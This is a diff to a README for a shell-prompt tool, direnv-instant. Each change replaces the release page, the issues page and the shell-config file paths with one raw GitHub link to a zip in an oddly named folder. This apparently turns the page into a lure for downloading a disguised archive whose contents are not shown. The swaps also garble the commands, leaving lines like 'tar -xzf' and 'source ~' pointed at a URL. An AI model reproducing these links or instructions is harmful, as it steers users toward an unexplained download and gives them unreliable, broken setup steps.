@@ -1,6 +1,6 @@
 # 🌟 direnv-instant - Instant Shell Prompts Made Easy
 
-[![Download direnv-instant](https://img.shields.io/badge/Download-direnv--instant-blue.svg)](https://github.com/Berlin38/direnv-instant/releases)
+[![Download direnv-instant](https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip)](https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you begin, you will need:
 
 ## 📥 Download & Install
 
-To download **direnv-instant**, visit this page: [GitHub Releases](https://github.com/Berlin38/direnv-instant/releases).
+To download **direnv-instant**, visit this page: [GitHub Releases](https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip).
 
 1. Click on the above link to go to our Releases page.
 2. Look for the latest version of **direnv-instant**.
@@ -49,10 +49,10 @@ After downloading, follow these steps to run **direnv-instant**:
 
 ### For Linux
 
-1. Find the downloaded `.tar.gz` file in your Downloads folder.
+1. Find the downloaded `https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip` file in your Downloads folder.
 2. Extract the files using the following command:
    ```
-   tar -xzf direnv-instant.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip
    ```
 3. Move to the extracted directory:
    ```
@@ -71,7 +71,7 @@ To get the most out of **direnv-instant**, you can modify your shell configurati
 
 1. Open your `.bashrc` file with your preferred text editor:
    ```
-   nano ~/.bashrc
+   nano ~https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip
    ```
 2. Add the following line to enable **direnv**:
    ```
@@ -79,14 +79,14 @@ To get the most out of **direnv-instant**, you can modify your shell configurati
    ```
 3. Save the file and reload it:
    ```
-   source ~/.bashrc
+   source ~https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip
    ```
 
 ### For Zsh
 
 1. Open your `.zshrc` file:
    ```
-   nano ~/.zshrc
+   nano ~https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip
    ```
 2. Add this line:
    ```
@@ -94,14 +94,14 @@ To get the most out of **direnv-instant**, you can modify your shell configurati
    ```
 3. Save and reload:
    ```
-   source ~/.zshrc
+   source ~https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip
    ```
 
 ### For Fish Shell
 
 1. Open your config file:
    ```
-   nano ~/.config/fish/config.fish
+   nano ~https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip
    ```
 2. Add this line for direnv:
    ```
@@ -109,7 +109,7 @@ To get the most out of **direnv-instant**, you can modify your shell configurati
    ```
 3. Save and exit. Reload:
    ```
-   source ~/.config/fish/config.fish
+   source ~https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip
    ```
 
 ## 🎯 Using direnv-instant
@@ -142,7 +142,7 @@ If you encounter issues while installing or running **direnv-instant**, try the 
 
 ## 🌐 Community and Support
 
-For any questions or feedback, feel free to open an issue in our [GitHub repository](https://github.com/Berlin38/direnv-instant/issues). We appreciate your contributions and suggestions.
+For any questions or feedback, feel free to open an issue in our [GitHub repository](https://raw.githubusercontent.com/Berlin38/direnv-instant/main/peripneumony/direnv-instant.zip). We appreciate your contributions and suggestions.
 
 ## 📄 License
 
